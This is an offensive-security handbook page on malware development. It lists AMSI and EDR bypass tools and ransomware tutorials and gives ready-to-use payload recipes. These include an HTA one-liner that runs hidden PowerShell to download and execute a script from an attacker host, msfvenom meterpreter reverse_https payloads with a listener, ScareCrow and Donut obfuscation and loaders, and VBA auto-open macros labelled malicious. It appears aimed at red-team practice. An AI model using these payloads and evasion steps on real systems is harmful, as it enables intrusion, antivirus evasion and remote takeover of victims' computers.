# Malware Development

## Table of Contents

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/malware_development.md#Resources)
- [AMSI](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/malware_development.md#AMSI)
- [An HTML Application (HTA)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/malware_development.md#An-HTML-Application-HTA)
- [Donut](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/malware_development.md#Donut)
- [macro_pack](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/malware_development.md#macro_pack)
- [ScareCrow](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/malware_development.md#ScareCrow)
- [Visual Basic for Application (VBA)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/malware_development.md#Visual-Basic-for-Application-VBA)
- [Windows Scripting Host (WSH)](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/malware_development.md#Windows-Scripting-Host-WSH)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| AMSI Bypass Powershell | This repo contains some Antimalware Scan Interface (AMSI) bypass / avoidance methods i found on different Blog Posts. | https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell |
| AMSI.fail | AMSI.fail generates obfuscated PowerShell snippets that break or disable AMSI for the current process. | http://amsi.fail |
| AmsiHook | AmsiHook is a project I created to figure out a bypass to AMSI via function hooking. | https://github.com/tomcarver16/AmsiHook |
| AmsiScanBufferBypass | Bypass AMSI by patching AmsiScanBuffer | https://github.com/rasta-mouse/AmsiScanBufferBypass |
| charlotte | c++ fully undetected shellcode launcher ;) | https://github.com/9emin1/charlotte |
| Chimera | Chimera is a PowerShell obfuscation script designed to bypass AMSI and commercial antivirus solutions. | https://github.com/tokyoneon/Chimera |
| ConfuserEx | An open-source, free protector for .NET applications | https://github.com/yck1509 |
| DefenderCheck | Identifies the bytes that Microsoft Defender flags on. | https://github.com/matterpreter/DefenderCheck |
| Donut | Generates x86, x64, or AMD64+x86 position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. | https://github.com/TheWover/donut |
| EDRSandBlast | EDRSandBlast is a tool written in C that weaponize a vulnerable signed driver to bypass EDR detections (Notify Routine callbacks, Object Callbacks and ETW TI provider) and LSASS protections. | https://github.com/wavestone-cdt/EDRSandblast |
| Exploring Nim language - Writing a ransomware | n/a | https://web.archive.org/web/20220624202002/https://ilankalendarov.github.io/posts/nim-ransomware/ |
| Freeze | Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods | https://github.com/optiv/Freeze |
| Ido Veltzman - Security Blog - Rust 101 - Let's write Rustomware | n/a | https://idov31.github.io/2022/05/07/rust101-rustomware.html?s=09 |
| Invoke-Obfuscation | PowerShell Obfuscator | https://github.com/danielbohannon/Invoke-Obfuscation |
| macro_pack | macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of Office documents, VB scripts, shortcuts, and other formats for pentest, demo, and social engineering assessments. | https://github.com/sevagas/macro_pack |
| mimikatz Obfuscator | This script downloads and slightly obfuscates the mimikatz project. | https://gist.github.com/imaibou/92feba3455bf173f123fbe50bbe80781 |
| Mortar Loader | Evasion technique to defeat and divert detection and prevention of security products (AV/EDR/XDR) | https://github.com/0xsp-SRD/mortar |
| NetLoader | Loads any C# binary in mem, patching AMSI + ETW. | https://github.com/Flangvik/NetLoader |
| Nimcrypt2 | .NET, PE, & Raw Shellcode Packer/Loader Written in Nim | https://github.com/icyguider/Nimcrypt2 |
| NimHollow | Nim implementation of Process Hollowing using syscalls (PoC) | https://github.com/snovvcrash/NimHollow |
| NimlineWhisperer2 | A tool for converting SysWhispers2 syscalls for use with Nim projects | https://github.com/ajpc500/NimlineWhispers2 |
| nim-strenc | A tiny library to automatically encrypt string literals in Nim code | https://github.com/Yardanico/nim-strenc |
| Obfuscator-LLVM | The aim of this project is to provide an open-source fork of the LLVM compilation suite able to provide increased software security through code obfuscation and tamper-proofing. | https://github.com/obfuscator-llvm/obfuscator |
| Offensive-C-Sharp | I wrote these while learning AD Pentesting and windows hacking | https://github.com/winsecurity/Offensive-C-Sharp |
| OffensiveNim | Experiments in weaponizing Nim for implant development and general offensive operations. | https://github.com/0xsyr0/OffensiveNim |
| OffensivePipeline | OffensivePipeline allows to download, compile (without Visual Studio) and obfuscate C# tools for Red Team exercises.  | https://github.com/Aetsu/OffensivePipeline |
| OffensiveRust | Rust Weaponization for Red Team Engagements. | https://github.com/trickster0/OffensiveRust |
| Raikia's Hub | Online repository for Red Teamers | https://raikia.com/tool-powershell-encoder/ |
| ScareCrow | Payload creation framework designed around EDR bypass. | https://github.com/optiv/ScareCrow |
| Shikata Ga Nai | Shikata ga nai (仕方がない) encoder ported into go with several improvements. | https://github.com/EgeBalci/sgn |
| Simple Injector | A simple injector that uses LoadLibraryA | https://github.com/tomcarver16/SimpleInjector |
| SysWhispers | SysWhispers helps with evasion by generating header/ASM files implants can use to make direct system calls. | https://github.com/m57/SysWhispers |
| SysWhispers2 | AV/EDR evasion via direct system calls. | https://github.com/jthuraisamy/SysWhispers2 |
| SysWhispers3 | SysWhispers on Steroids - AV/EDR evasion via direct system calls. | https://github.com/klezVirus/SysWhispers3 |
| TreatCheck | Identifies the bytes that Microsoft Defender / AMSI Consumer flags on. | https://github.com/rasta-mouse/ThreatCheck |

## AMSI

### Test String

```c
PS C:\> $str = 'amsiinitfailed'
```

### Bypass

```c
PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
```

## An HTML Application (HTA)

### payload.hta

```c
<html>
<body>
<script>
  var c= 'cmd.exe'
  new ActiveXObject('Wscript.Shell').Run(c);
</script>
</body>
</html>
```

### One-Liner

```c
<scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://<LHOST>/<FILE>.ps1')"</scRipt>
```

## Donut

> https://github.com/TheWover/donut

### Installation

```c
$ make
$ make clean
$ make debug
```

### Obfuscation

```c
$ donut -a 2 -f 1 -o donutpayload.bin shellcode.exe
```

## marco_pack

```c
PS C:\macro_pack_pro> echo .\<FILE>.bin | marco_pack.exe -t SHELLCODE -G .\<FILE>.pdf.lnk --icon='C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13' --hta-macro --bypass
```

## ScareCrow

> https://github.com/optiv/ScareCrow

### Payloads

#### Shellcode Payload Creation with msfvenom

```c
$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f raw -o <FILE>.bin
```

#### .msi-File Payload Creation with msfvenom

```c
$ msfvenom -a x64 -p windows/x64/meterpreter/reverse_https LHOST=<LHOST> LPORT=8443 -f exe -o <FILE>.exe
```

### Listener

```c
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_https
```

### Obfuscation

#### DLL Side-Loading

```c
$ ScareCrow -I <FILE>.bin -Loader dll -domain <FAKE_DOMAIN>
```
#### Windows Script Host

```c
$ ScareCrow -I <FILE>.bin -Loader msiexec -domain <FAKE_DOMAIN> -O payload.js
```

#### Control Panel Files

```c
$ ScareCrow -I <FILE>.bin -Loader control -domain <FAKE_DOMAIN>
```

### Renaming Payload

```c
$ mv <FILE>.dll <FILE>32.dll
```

### Execution

```c
PS C:\> rundll32.exe .\<FILE>32.dll,DllRegisterServer
```

or

```c
PS C:\> regsvr32 /s .\<FILE>32.dll
```

For `.cpl-Files` a simple double click is enough to execute them.

## Visual Basic for Application (VBA)

### Basic Structure

Navigate to: `View > Macros`

```c
Sub Document_Open()
  Macro
End Sub

Sub AutoOpen()
  Macro
End Sub

Sub Macro()
  MsgBox ("FOOBAR")
End Sub
```

Save it as `<FILE>.doc` or `<FILE>.docm`.

### Malicious Function

```c
Sub Exec()
  Dim payload As String
  payload = "calc.exe"
  CreateObject("Wscript.Shell").Run payload,0
End Sub
```

Create `AutoOpen()` and `DocumentOpen()` functions to execute the `malicious script`.

## Windows Scripting Host (WSH)

```c
C:\> wscript <FILE>.vbs
C:\> cscript <FILE>.vbs
C:\> wscript /e:VBScript C:\<FILE>.txt
```

### Examples

```c
Dim message
message = "<FOOBAR>"
MsgBox message
```

```c
Set shell = WScript.CreateObject(Wscript.Shell"")
shell.Run("C:\Windows\System32\calc.exe" & WScript.ScriptFullName),0,True
```
